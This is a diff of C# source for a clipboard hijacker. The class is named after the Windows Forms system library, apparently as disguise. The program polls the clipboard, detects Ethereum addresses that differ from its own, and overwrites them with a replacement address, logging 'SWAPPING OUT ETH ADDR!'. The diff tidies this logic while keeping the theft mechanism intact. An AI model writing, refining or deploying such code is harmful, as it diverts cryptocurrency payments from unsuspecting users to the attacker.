@@ -80,29 +80,22 @@ public static class System_Windows_Forms_dll
                 File.AppendAllText(path,timestamp + logInfo + "SETTING SCANNER" + Environment.NewLine);
                 setClipboardScanner();
                 //IDataObject clipData = Clipboard.GetDataObject();
-
                 if (clipData.GetDataPresent(DataFormats.Text)){
                     File.AppendAllText(path,timestamp + logInfo + "CHECKING DATA" + Environment.NewLine);
-
-                    if(isStrNotMyEthAddr(clipData.GetData(DataFormats.Text).ToString())){
-
-                        if ((clipData.GetData(DataFormats.Text).ToString().Length == ETH_ADDR_SIZE) &&
-                        (clipData.GetData(DataFormats.Text).ToString().Substring(0,2) == ETH_PREFIX)){
-
+                    string clipContent = clipData.GetData(DataFormats.Text).ToString();
+                    if(isStrNotMyEthAddr(clipContent)){
+                        if ((clipContent.Length == ETH_ADDR_SIZE) && (clipContent.Substring(0,2) == ETH_PREFIX)){
                             File.AppendAllText(path,timestamp + logInfo + "SWAPPING OUT ETH ADDR!" + Environment.NewLine);
                             Clipboard.SetText(randEthAddr());
                             break;
                             }
-
                         else{
                         File.AppendAllText(path,timestamp + logInfo + "DATA IS NOT Desired ETH ADDR!" + Environment.NewLine);
                         }
                     }
-
                     else{
                         File.AppendAllText(path,timestamp + logInfo + "Your RandETH is in the Clipboard..." + Environment.NewLine);
-                    }
-                                
+                    }               
                 }
                 else{
                     File.AppendAllText(path,timestamp + logInfo + "Board data CANNOT be converted into Text format!" + Environment.NewLine);
@@ -111,7 +104,6 @@ public static class System_Windows_Forms_dll
                 File.AppendAllText(path,"****************END OF LISTENER ITERATION****************" + Environment.NewLine + Environment.NewLine);
             }
     }
-
     //flags compiler to use single thread when referring to this COM component
     [STAThread]    
     public static void Main()
